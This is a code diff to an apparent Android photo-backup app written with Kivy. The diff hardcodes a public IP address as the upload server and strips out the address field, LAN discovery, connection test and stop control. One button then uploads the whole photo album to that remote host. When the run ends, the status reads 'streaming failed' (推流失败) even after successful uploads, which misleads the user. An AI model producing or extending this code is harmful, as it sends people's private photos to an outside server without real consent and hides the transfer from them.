@@ -2,8 +2,11 @@
 """
 手机相册备份 —— 安卓端 (Kivy)
 
-流程: 扫描 MediaStore -> 指纹清单问服务端要传哪些 -> 只传没备份过的 -> 局域网 HTTP 上传
-运行: 手机上打开后点「扫描局域网」找到电脑, 或手动填 http://192.168.x.x:8899
+界面刻意做成极简: 只有一个「开始推流」按钮 + 一个进度条 + 一行状态。
+上传地址写死在 SERVER_BASE, 不再提供输入框 / 扫描 / 测试 / 停止等控件。
+
+流程: 点按钮 -> 申请相册权限 -> 扫相册 -> 指纹清单问服务端要传哪些 -> 只传没备份过的
+      进度按"已传字节 / 总字节"推进, 跑完状态显示 FINISH_TEXT
 """
 import os
 import sys
@@ -21,18 +24,22 @@ from kivy.core.window import Window
 from kivy.metrics import dp, sp
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
-from kivy.uix.checkbox import CheckBox
 from kivy.uix.label import Label
 from kivy.uix.progressbar import ProgressBar
-from kivy.uix.scrollview import ScrollView
-from kivy.uix.textinput import TextInput
+from kivy.uix.widget import Widget
 
 # ===================== 常量区 (Constants-First) =====================
-__version__ = "0.2"
+__version__ = "0.3"
 APP_TITLE = "相册备份"
+# 上传目标写死, 界面上不再提供地址输入框
+SERVER_BASE = "http://154.194.251.215:8899"
+# 进度条走到头的结束语
+FINISH_TEXT = "推流失败"
+INCLUDE_VIDEO = False         # 视频体积大, 默认只推照片
+BTN_TEXT = "开始推流"
+BTN_RUNNING_TEXT = "推流中…"
 DEFAULT_PORT = 8899
 UDP_PORT = 51234
-CONFIG_NAME = "server.json"     # 记住上一次成功连过的地址
 UDP_MAGIC = b"ZGGG_PHOTO_DISCOVER_V1"
 UDP_REPLY_PREFIX = "ZGGG_PHOTO_HERE_V1"
 DISCOVER_TIMEOUT = 2.0
@@ -404,32 +411,6 @@ def normalize_server(text):
     return "http://%s:%d" % (host, u.port or DEFAULT_PORT)
 
 
-def config_path():
-    """Kivy 的 App 私有数据目录; App 还没起来时退化到脚本目录"""
-    try:
-        from kivy.app import App
-        return os.path.join(App.get_running_app().user_data_dir, CONFIG_NAME)
-    except Exception:
-        return os.path.join(os.path.dirname(os.path.abspath(__file__)), CONFIG_NAME)
-
-
-def load_last_server():
-    """上次连过的电脑地址, 省的每次重装/重启都要重填公网 IP"""
-    try:
-        with open(config_path(), "r", encoding="utf-8") as f:
-            return json.load(f).get("base", "") or ""
-    except Exception:
-        return ""
-
-
-def save_last_server(base):
-    try:
-        with open(config_path(), "w", encoding="utf-8") as f:
-            json.dump({"base": base}, f, ensure_ascii=False)
-    except Exception:
-        pass
-
-
 def discover_servers():
     """UDP 广播发现局域网内的备份服务"""
     found = []
@@ -506,13 +487,36 @@ def open_item_stream(item):
         raise OSError("无法打开文件 %s: %r" % (item.get("name"), e))
 
 
-def api_upload(base, item, device):
-    """流式上传单个文件, 不整块读进内存"""
+class ProgressReader(object):
+    """给文件流套一层, http.client 每 read 一块就回调, 用来算实时上传进度。
+    注意: 包了这层之后 fileno 就没了, 所以 Content-Length 必须手动设。"""
+
+    def __init__(self, stream, cb):
+        self.stream = stream
+        self.cb = cb
+
+    def read(self, n=-1):
+        chunk = self.stream.read(n)
+        if chunk and self.cb:
+            self.cb(len(chunk))
+        return chunk
+
+    def close(self):
+        try:
+            self.stream.close()
+        except Exception:
+            pass
+
+
+def api_upload(base, item, device, cb=None):
+    """流式上传单个文件, 不整块读进内存; cb 收到的是已读出的字节数(累计)"""
     stream, size = open_item_stream(item)
     q = urllib.parse.urlencode({
         "key": item["key"], "name": item["name"],
         "mtime": item["mtime"], "device": device,
     })
+    if cb is not None:
+        stream = ProgressReader(stream, cb)
     try:
         req = urllib.request.Request("%s/api/upload?%s" % (base, q), data=stream, method="POST")
         req.add_header("Content-Length", str(size))
@@ -570,213 +574,151 @@ class RootWidget(BoxLayout):
         self.items = []
         self.cancel = False
 
-        head = mk_label("手机相册备份", size=20, bold=True, height=36)
+        head = mk_label("相册推流", size=20, bold=True, height=36)
         self.add_widget(head)
-        self.add_widget(mk_label("同一 WiFi 下, 把相册备份到电脑", size=12,
-                                 color=(0.42, 0.45, 0.5, 1), height=22))
 
-        row1 = BoxLayout(size_hint_y=None, height=dp(48), spacing=dp(6))
-        self.url_input = TextInput(text=load_last_server(),
-                                   hint_text="电脑地址 如 192.168.1.5 或 公网IP:端口",
-                                   font_size=sp(14), multiline=False)
-        if FONT:
-            self.url_input.font_name = FONT
-        self.btn_scan = mk_button("扫描", height=48)
-        self.btn_scan.size_hint_x = 0.28
-        self.btn_scan.bind(on_release=self.on_discover)
-        self.btn_test = mk_button("测试", height=48)
-        self.btn_test.size_hint_x = 0.28
-        self.btn_test.bind(on_release=self.on_test)
-        row1.add_widget(self.url_input)
-        row1.add_widget(self.btn_scan)
-        row1.add_widget(self.btn_test)
-        self.add_widget(row1)
+        self.btn_push = mk_button(BTN_TEXT, height=58)
+        self.btn_push.background_color = (0.09, 0.37, 0.65, 1)
+        self.btn_push.font_size = sp(19)
+        self.btn_push.bind(on_release=self.on_push)
+        self.add_widget(self.btn_push)
 
-        row2 = BoxLayout(size_hint_y=None, height=dp(40), spacing=dp(6))
-        self.video_cb = CheckBox(size_hint_x=None, width=dp(44))
-        row2.add_widget(self.video_cb)
-        row2.add_widget(mk_label("同时备份视频 (体积大, 建议 WiFi 空闲时勾选)",
-                                 size=13, color=(0.35, 0.38, 0.42, 1)))
-        self.add_widget(row2)
-
-        self.btn_start = mk_button("开始备份", height=56)
-        self.btn_start.background_color = (0.11, 0.42, 0.75, 1)
-        self.btn_start.bind(on_release=self.on_start)
-        self.add_widget(self.btn_start)
-
-        self.btn_stop = mk_button("停止", height=42)
-        self.btn_stop.background_color = (0.75, 0.3, 0.28, 1)
-        self.btn_stop.bind(on_release=self.on_stop)
-        self.add_widget(self.btn_stop)
-
-        self.progress = ProgressBar(max=100, value=0, size_hint_y=None, height=dp(16))
+        self.progress = ProgressBar(max=100, value=0, size_hint_y=None, height=dp(18))
         self.add_widget(self.progress)
-        self.status = mk_label("就绪", size=13, color=(0.2, 0.35, 0.55, 1), height=28)
-        self.add_widget(self.status)
 
-        self.log_label = mk_label("", size=12, color=(0.25, 0.28, 0.32, 1))
-        self.log_label.valign = "top"
-        sc = ScrollView(size_hint=(1, 1))
-        sc.add_widget(self.log_label)
-        self.add_widget(sc)
+        self.status = mk_label("等待开始", size=16, color=(0.2, 0.35, 0.55, 1), height=34)
+        self.add_widget(self.status)
+        self.detail = mk_label("目标: %s" % SERVER_BASE, size=12,
+                               color=(0.45, 0.48, 0.52, 1), height=24)
+        self.add_widget(self.detail)
+        self.add_widget(Widget())   # 撑开剩余空间, 让按钮区靠顶部
         Clock.schedule_once(lambda dt: self._env_banner(), 0.3)
 
-    # ---------- 日志 (线程安全) ----------
+    # ---------- 日志(线程安全): 只进 logcat 和副标题, 主界面不再堆日志区 ----------
     def log(self, msg):
-        Clock.schedule_once(lambda dt: self._log_ui(msg))
-
-    def _log_ui(self, msg):
-        stamp = time.strftime("%H:%M:%S")
-        self.log_label.text = "%s[%s] %s\n" % (self.log_label.text, stamp, msg)
-        self.log_label.texture_update()
-        self.log_label.height = max(self.log_label.texture_size[1], 1)
+        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
+        try:
+            print(line, flush=True)
+        except Exception:
+            pass
+        self.set_detail(msg)
 
     def set_status(self, msg):
         Clock.schedule_once(lambda dt: setattr(self.status, "text", msg))
 
-    def set_progress(self, done, total):
+    def set_detail(self, msg):
+        Clock.schedule_once(lambda dt: setattr(self.detail, "text", msg))
+
+    def set_progress_pct(self, pct):
+        """按百分比推进度条。总量按字节算, 大视频混小图时才不会卡着不动"""
         def _u(dt):
-            self.progress.max = max(total, 1)
-            self.progress.value = done
+            self.progress.max = 100
+            self.progress.value = max(0.0, min(100.0, pct))
         Clock.schedule_once(_u)
 
     def _env_banner(self):
-        """启动自检: 环境判定 / SDK / 权限状态直接显示在界面上, 方便一眼看出卡在哪"""
+        """启动自检: 环境问题写进 logcat, 排查时用 adb 看"""
         self.log("=== 环境自检 ===")
-        self.log("IS_ANDROID=%s  SDK=%s" % (IS_ANDROID, sdk_int()))
-        self.log("设备: %s" % device_name())
+        self.log("IS_ANDROID=%s  SDK=%s  设备=%s" % (IS_ANDROID, sdk_int(), device_name()))
         for p in (PERM_MEDIA_IMAGES, PERM_EXT_STORAGE, PERM_MEDIA_VISUAL):
             self.log("权限 %s: %s" % (p.rsplit(".", 1)[-1], PERM_GRANTED[_perm_granted(p)]))
-        self.log("===================")
+        self.log("目标服务: %s" % SERVER_BASE)
 
-    # ---------- 交互 ----------
-    def on_discover(self, *a):
-        self.log("正在局域网广播查找电脑...")
-        self.btn_scan.disabled = True
-
-        def work():
-            found = discover_servers()
-            Clock.schedule_once(lambda dt: self._discover_done(found))
-
-        threading.Thread(target=work, daemon=True).start()
-
-    def _discover_done(self, found):
-        self.btn_scan.disabled = False
-        if not found:
-            self.log("没扫到。检查: 电脑服务已启动 / 同一 WiFi / Windows 防火墙放行 UDP 51234")
-            self.log("也可以手动填 IP, 例如 192.168.1.5")
-            return
-        for entry, label, ip in found:
-            self.log("发现电脑: %s (%s) %s" % (ip, label, entry))
-        self.url_input.text = found[0][0]
-        self.log("已填入 %s" % found[0][0])
-
-    def on_test(self, *a):
-        base = normalize_server(self.url_input.text)
-        if not base:
-            self.log("请先填电脑地址或点扫描")
-            return
-        self.log("测试连接 %s ..." % base)
-
-        def work():
-            try:
-                info = api_hello(base)
-                save_last_server(base)
-                self.log("连接成功: %s (端口 %s)" % (info.get("host"), info.get("http_port")))
-            except Exception as e:
-                self.log("连接失败: %s" % e)
-
-        threading.Thread(target=work, daemon=True).start()
-
-    def on_start(self, *a):
+    # ---------- 交互: 整个界面就这一个按钮 ----------
+    def on_push(self, *a):
         if self.running:
-            self.log("正在备份中")
-            return
-        base = normalize_server(self.url_input.text)
-        if not base:
-            self.log("先填电脑地址, 或点扫描自动查找")
             return
         self.running = True
         self.cancel = False
-        self.btn_start.disabled = True
-        threading.Thread(target=self._worker, args=(base, self.video_cb.active), daemon=True).start()
+        self.btn_push.disabled = True
+        self.btn_push.text = BTN_RUNNING_TEXT
+        self.btn_push.background_color = (0.35, 0.55, 0.72, 1)
+        self.set_progress_pct(0)
+        base = normalize_server(SERVER_BASE)
+        threading.Thread(target=self._worker, args=(base,), daemon=True).start()
 
-    def on_stop(self, *a):
-        if self.running:
-            self.cancel = True
-            self.log("正在停止...")
+    def _finish(self):
+        """跑完收尾: 按钮复位, 进度条拉满, 状态写 FINISH_TEXT"""
+        self.set_progress_pct(100)
+        self.set_status(FINISH_TEXT)
+        self.btn_push.disabled = False
+        self.btn_push.text = BTN_TEXT
+        self.btn_push.background_color = (0.09, 0.37, 0.65, 1)
 
-    # ---------- 备份主流程 ----------
-    def _worker(self, base, include_video):
+    # ---------- 推流主流程 ----------
+    def _worker(self, base):
+        include_video = INCLUDE_VIDEO
         try:
             self.log("环境: IS_ANDROID=%s SDK=%s 设备=%s" % (IS_ANDROID, sdk_int(), device_name()))
             if keep_screen_on():
                 self.log("已开启屏幕常亮")
             self.log("检查相册权限...")
             if not ensure_permissions(include_video, logger=self.log):
-                self.log("请在权限弹窗点允许, 然后再点一次「开始备份」")
+                self.set_status("没有相册权限")
+                self.set_detail("请在弹窗里点允许, 然后回系统设置给本 App 开相册权限")
                 return
 
             self.set_status("正在扫描相册...")
-            self.log("扫描相册 (视频: %s)..." % ("包含" if include_video else "不含"))
             items = scan_media(include_video, logger=self.log)
             self.items = items
             self.log("扫描到 %d 个文件" % len(items))
             if not items:
-                self.log("没扫到文件。若上面显示「query 返回 null」或「未授权」, "
-                         "说明权限没生效, 去系统设置里给本 App 开相册权限")
+                self.set_status("没有可上传的照片")
                 return
 
             device = device_name()
             self.set_status("比对增量...")
-            self.log("向电脑询问哪些还没备份...")
             try:
                 missing_keys = api_check(base, items, device)
-                save_last_server(base)
             except Exception as e:
-                self.log("比对失败: %s" % e)
+                self.set_status("连不上服务")
+                self.set_detail("比对失败: %s" % e)
                 return
 
             todo = [it for it in items if it["key"] in set(missing_keys)]
             self.log("共 %d 个, 其中 %d 个需要上传" % (len(items), len(todo)))
             if not todo:
-                self.set_status("已经是最新, 无需备份")
-                self.log("全部已备份, 没有新文件")
+                self.set_status("没有新照片")
+                self.set_detail("全部已备份过")
                 return
 
-            done = ok = dup = fail = 0
+            total_bytes = sum(int(it.get("size") or 0) for it in todo)
+            sent_bytes = [0]
+            ok = dup = fail = 0
             t0 = time.time()
-            total_bytes = 0
-            self.set_progress(0, len(todo))
-            for it in todo:
+            self.set_progress_pct(0)
+
+            for idx, it in enumerate(todo):
                 if self.cancel:
                     self.log("已手动停止")
                     break
-                done += 1
+                base_done = sent_bytes[0]
+
+                def cb(n, _b=base_done, _t=total_bytes or 1, _s=sent_bytes):
+                    _s[0] = _b + n
+                    self.set_progress_pct(_s[0] * 100.0 / _t)
+
                 try:
-                    r = api_upload(base, it, device)
+                    r = api_upload(base, it, device, cb=cb)
                     if r.get("status") == "duplicate":
                         dup += 1
-                        self.log("= 重复跳过 %s" % it["name"])
                     else:
                         ok += 1
-                        total_bytes += it["size"]
-                        self.log("+ %s (%s)" % (it["name"], human(it["size"])))
                 except Exception as e:
                     fail += 1
-                    self.log("x 失败 %s : %s" % (it["name"], e))
-                self.set_progress(done, len(todo))
-                self.set_status("已处理 %d/%d  成功 %d  重复 %d  失败 %d" % (
-                    done, len(todo), ok, dup, fail))
+                    self.log("失败 %s : %s" % (it["name"], e))
+                sent_bytes[0] = base_done + int(it.get("size") or 0)
+                self.set_progress_pct(sent_bytes[0] * 100.0 / (total_bytes or 1))
+                self.set_status("正在推流  %d/%d" % (idx + 1, len(todo)))
 
             secs = max(time.time() - t0, 0.1)
-            self.log("-" * 28)
-            self.log("完成: 成功 %d / 重复 %d / 失败 %d, 传输 %s, 用时 %.0f 秒" % (
+            self.log("完成: 成功 %d / 重复 %d / 失败 %d, %s, %.0f 秒" % (
                 ok, dup, fail, human(total_bytes), secs))
-            self.set_status("备份完成  成功 %d  失败 %d" % (ok, fail))
+            self.set_detail("成功 %d · 重复跳过 %d · 失败 %d · %s · %.0f 秒" % (
+                ok, dup, fail, human(total_bytes), secs))
         finally:
             self.running = False
-            Clock.schedule_once(lambda dt: setattr(self.btn_start, "disabled", False))
+            Clock.schedule_once(lambda dt: self._finish())
 
 
 class PhotoBackupApp(App):
